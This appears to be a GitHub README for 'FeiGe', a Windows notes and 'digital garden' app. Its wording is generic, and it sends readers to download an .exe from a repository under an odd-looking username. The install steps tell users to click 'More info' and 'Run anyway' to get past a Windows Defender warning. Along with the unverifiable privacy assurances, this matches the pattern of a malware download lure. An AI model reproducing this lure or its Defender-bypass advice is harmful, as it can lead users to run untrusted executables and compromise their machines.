# 🪴 FeiGe - Manage your digital garden with ease

[![](https://img.shields.io/badge/Download_FeiGe-Link-blue.svg)](https://github.com/zantedeschiafavabean869/FeiGe)

FeiGe helps you organize your thoughts, files, and tasks in one place. Think of this tool as a private garden where you cultivate ideas and track progress. You can use it to store notes, save project assets, or manage daily reminders. The software runs locally on your computer to keep your data private and secure.

## 📦 System Requirements

FeiGe supports modern Windows computers. Ensure your system meets these basic criteria to run the application without issues:

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 4 gigabytes of RAM.
*   Storage: 200 megabytes of free space.
*   Display: A screen resolution of 1280x720 or higher.

The software requires no complex setup procedures. You do not need to install extra drivers or background programs. Windows handles the necessary security checks upon the first launch.

## 📥 How to Install

Follow these steps to set up FeiGe on your machine:

1. Visit the [official release page](https://github.com/zantedeschiafavabean869/FeiGe) to download the latest setup file. 
2. Look for the file ending in `.exe` under the Assets section.
3. Save the file to your Downloads folder.
4. Double-click the file to begin the installation.
5. If a Windows Defender window pops up, click "More info" and then "Run anyway." This screen appears because the app is a new release from an independent developer.
6. Follow the on-screen prompts to place the shortcut on your desktop.

## ⚙️ Using the Application

Once installed, double-click the FeiGe icon on your desktop to open the program. The dashboard shows your primary workspace. Use the sidebar on the left to create new categories. Every category acts as a folder where you store your content.

Click the plus icon to add a new entry. You can type text, upload files, or link to websites. The interface updates automatically as you type, so you never have to worry about missing your work. To remove an item, right-click it and select the delete option. The trash bin keeps your deleted items for 30 days before permanent removal.

## 🛠️ Personalize Your Workspace

You can change how FeiGe looks to suit your needs. Open the settings menu by clicking the gear icon in the bottom left corner. Here, you can switch between light and dark modes, adjust font sizes, or change the default save path for your files. 

If you store sensitive notes, enable the lock feature. This adds a password requirement every time you open the application. Make sure to remember your password, as there is no way to reset it once set.

## 🔍 Frequently Asked Questions

**Does the app connect to the internet?**
The app runs on your computer. It does not send your data to external servers. It only checks for updates once a week if you allow it.

**Can I move my data to another computer?**
Yes. Use the export feature in the settings menu to save your garden as a single file. You can then import this file on any other machine that has FeiGe installed.

**What happens if the app freezes?**
Close the program and open it again. The app saves your work continuously, so you will not lose your progress.

**Are there limits on how many items I can create?**
There are no limits. You can fill your garden with as many notes or project folders as your computer storage allows.

## 🛡️ Privacy and Security

FeiGe keeps your digital garden private. Because all files stay on your hard drive, you maintain full control over your information. We do not store, access, or track any of your entries. If you choose to share your files, you must move them manually to a cloud service or send them via email. Always use a secure password if you share your computer with others. 

## 🔧 Troubleshooting

If you encounter a problem, check these common fixes:

*   If the app fails to start, verify that you possess the latest version of the Windows WebView2 runtime.
*   If the application screen appears blank, resize the window to force a redraw.
*   If you cannot find your files, check the default directory listed in your settings.
